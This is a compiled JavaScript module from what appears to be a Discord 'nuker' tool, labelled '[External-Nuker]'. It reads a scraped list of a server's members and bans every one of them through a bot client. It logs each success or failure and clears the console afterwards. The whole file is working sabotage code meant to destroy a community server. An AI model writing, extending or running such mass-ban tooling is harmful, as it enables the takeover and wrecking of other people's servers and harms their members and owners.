"use strict";
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
const chalk_1 = require("chalk");
const scrape_1 = __importDefault(require("../../models/scrape"));
const createString_1 = require("../../utils/createString");
const getTheme_1 = require("../../utils/getTheme");
const wizz_1 = require("../wizz");
module.exports = (client, db, rl, guildID) => __awaiter(void 0, void 0, void 0, function* () {
    function nukeStr(str, type) {
        let mainColor = getTheme_1.getTheme(db);
        let r = `              ${mainColor("[")}${chalk_1.white(type === "rateLimit"
            ? "!"
            : type === "success"
                ? "+"
                : type === "fail"
                    ? "-"
                    : "")}${mainColor("]")} ${chalk_1.white(str)}`;
        return r;
    }
    let scrape = yield scrape_1.default.findOne({
        Username: db.get("username"),
        Guild: guildID,
    });
    let server = client.guilds.cache.get(guildID);
    if (!scrape) {
        console.log(createString_1.createString("No scrape data for the server", db, "semi", "fail"));
        setTimeout(() => {
            wizz_1.wizz(client, db, rl);
        }, 1000);
        return;
    }
    let c = 1;
    let scraper = scrape;
    let mainColor = getTheme_1.getTheme(db);
    scraper.Members.forEach((member, i) => {
        let inter = setInterval(() => {
            if (c >= scraper.Members.length) {
                setTimeout(() => {
                    wizz_1.wizz(client, db, rl);
                    console.log(" ");
                    console.log(createString_1.createString("Making sure console is clean.. Please wait", db, "semi"));
                    setTimeout(() => {
                        console.clear();
                        console.log(createString_1.createString("Running second cleaning..", db, "semi"));
                        setTimeout(() => {
                            console.clear();
                            wizz_1.wizz(client, db, rl);
                        }, 700);
                    }, 400);
                }, 500);
                clearInterval(inter);
            }
        }, 500);
        server.members
            .ban(member)
            .then(() => {
            process.title = `[External-Nuker] - Banned ${member}`;
            c++;
            console.log(nukeStr(`Banned member ${mainColor(member)}`, "success"));
        })
            .catch(() => {
            process.title = `[External-Nuker] - Failed to ban ${member}`;
            c++;
            console.log(nukeStr(`Failed to ban member ${mainColor(member)}`, "fail"));
        });
    });
});
